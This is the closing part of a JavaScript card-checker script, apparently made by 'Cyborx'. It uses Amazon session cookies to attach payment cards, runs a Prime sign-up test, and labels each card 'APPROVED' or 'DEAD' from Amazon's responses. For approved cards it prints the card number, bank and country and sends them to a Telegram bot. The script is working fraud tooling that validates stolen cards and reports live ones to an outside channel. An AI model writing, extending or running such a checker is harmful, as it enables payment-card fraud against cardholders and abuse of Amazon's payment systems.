                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://apx-security.amazon.com/cpe/pm/register'
            },
            httpsAgent, responseType: 'text', maxRedirects: 10
        }
    );

    // ── Step 8: Prime test ────────────────────────────────────────────────────
    console.log('🎯  Ejecutando Prime test...');
    const resultado = await primeTeste(cookiesa);

    // ── Step 9: Limpiar card ──────────────────────────────────────────────────
    await deleteCard(cookie);

    // ─── Evaluar resultado ────────────────────────────────────────────────────
    console.log('\n╔══════════════════════════════════════╗');

    if (
        resultado.includes('BILLING_ADDRESS_RESTRICTED') ||
        resultado.includes('Non è stato possibile completare')
    ) {
        const err = 'Authorised (00)';
        console.log('║           ✅  APPROVED ✅             ║');
        console.log('╚══════════════════════════════════════╝');
        console.log(`\n💳  Card     : ${cc1}`);
        console.log(`📋  Status   : APPROVED`);
        console.log(`🔑  Response : ${err}`);
        console.log(`🏦  Info     : ${brand} | ${card_type} | ${level}`);
        console.log(`🏛️  Bank     : ${issuer}`);
        console.log(`🌍  Country  : ${country_info}\n`);

        if (botToken && telegramId) {
            const msg =
                `<b>#AmazonAuth</b>\n━━━━━━━━━━━\n` +
                `[ﾒ] <b>Card ➜</b> <code>${cc1}</code>\n` +
                `[ﾒ] <b>Status ➜</b> Approved ✅\n` +
                `[ﾒ] <b>Response ➜</b> ${err} 🎉\n` +
                `[ﾒ] <b>Gateway ➜</b> Amazon Auth\n━━━━━━━━━━━\n` +
                `[ﾒ] <b>Info ➜</b> ${brand} - ${card_type} - ${level}\n` +
                `[ﾒ] <b>Bank ➜</b> ${issuer}\n` +
                `[ﾒ] <b>Country ➜</b> ${country_info}\n━━━━━━━━━━━\n` +
                `[ㇺ] <b>Dev ➜</b> Cyborx`;
            await sendTelegram(botToken, telegramId, msg);
            console.log('📨  Notificación enviada a Telegram.\n');
        }

    } else if (
        resultado.includes('InvalidInput') ||
        resultado.includes('HARDVET_VERIFICATION_FAILED') ||
        resultado.includes('hardVet') ||
        resultado.includes('There was an error validating your payment method')
    ) {
        console.log('║         ❌  DECLINED ❌               ║');
        console.log('╚══════════════════════════════════════╝');
        console.log(`\n💳  Card     : ${cc1}`);
        console.log(`📋  Status   : DEAD`);
        console.log(`🔑  Response : Authorization Refused`);
        console.log(`🏦  Info     : ${brand} | ${card_type} | ${level}`);
        console.log(`🏛️  Bank     : ${issuer}`);
        console.log(`🌍  Country  : ${country_info}\n`);

    } else {
        console.log('║       ⚠️  COOKIE EXPIRED ⚠️           ║');
        console.log('╚══════════════════════════════════════╝');
        console.log(`\n💳  Card     : ${cc1}`);
        console.log(`📋  Status   : DEAD`);
        console.log(`🔑  Response : Cookie Expired`);
        console.log(`🏦  Info     : ${brand} | ${card_type} | ${level}`);
        console.log(`🏛️  Bank     : ${issuer}`);
        console.log(`🌍  Country  : ${country_info}\n`);
    }

    process.exit(0);
}

main().catch(err => {
    console.error('\n❌ Error fatal:', err.message);
    process.exit(1);
});